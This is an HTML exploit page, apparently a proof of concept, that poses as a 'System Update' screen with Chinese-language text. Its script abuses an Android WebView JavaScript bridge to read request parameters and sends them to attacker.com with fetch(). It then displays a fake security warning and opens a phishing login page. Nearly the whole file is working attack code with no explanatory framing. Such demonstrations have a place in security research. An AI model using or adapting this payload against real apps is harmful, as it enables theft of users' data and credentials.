<!-- exploit.html - 部署在 attacker.com -->
<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
</head>
<body>
    <h1>系统安全更新</h1>
    <p>正在检测您的设备...</p>
    
    <script>
    // 窃取敏感信息
    try {
        var params = Android.getRequestParams();
        console.log("窃取成功:", params);
        
        // 外带数据
        fetch('https://attacker.com/collect?data=' + encodeURIComponent(params));
        
        // 显示钓鱼提示
        Android.showToast('检测到安全风险，请点击确认');
        
        // 打开钓鱼页面
        setTimeout(function() {
            Android.openUrl('image', 'https://attacker.com/phishing_login.html');
        }, 2000);
        
    } catch(e) {
        console.log("JSInterface 调用失败:", e);
        document.body.innerHTML += '<p>错误：' + e.message + '</p>';
    }
    </script>
</body>
</html>
